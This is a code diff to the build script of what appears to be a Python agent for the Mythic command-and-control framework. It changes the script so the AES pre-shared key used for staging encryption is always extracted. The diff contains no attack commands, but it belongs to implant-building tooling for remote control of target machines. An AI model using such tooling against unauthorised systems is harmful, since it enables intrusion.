@@ -99,22 +99,23 @@ Messenger god. Requires Python 3.8+ and pip install cryptography on target.
             else:
                 use_psk = str(eec_raw).lower() in ("false", "0", "f", "no")
 
+            # Always extract AESPSK: needed for staging encryption in EKE mode too.
+            # Per Mythic docs, staging_rsa messages are encrypted with the AESPSK.
             aes_psk_b64 = ""
-            if use_psk:
-                try:
-                    raw = params.get("AESPSK")
-                    if isinstance(raw, dict):
-                        aes_psk_b64 = (
-                            str(raw.get("enc_key") or "").strip()
-                            or str((raw.get("value") or {}).get("enc_key") or "").strip()
-                            or str(raw.get("value") or "").strip()
-                        )
-                    elif isinstance(raw, str):
-                        aes_psk_b64 = raw.strip()
-                    if not aes_psk_b64:
-                        build_stderr += "AESPSK requested but key is missing or empty.\n"
-                except Exception as e:
-                    build_stderr += f"AESPSK extraction error: {e}\n"
+            try:
+                raw = params.get("AESPSK")
+                if isinstance(raw, dict):
+                    aes_psk_b64 = (
+                        str(raw.get("enc_key") or "").strip()
+                        or str((raw.get("value") or {}).get("enc_key") or "").strip()
+                        or str(raw.get("value") or "").strip()
+                    )
+                elif isinstance(raw, str):
+                    aes_psk_b64 = raw.strip()
+            except Exception as e:
+                build_stderr += f"AESPSK extraction error: {e}\n"
+            if use_psk and not aes_psk_b64:
+                build_stderr += "AESPSK requested but key is missing or empty.\n"
 
             import re
 
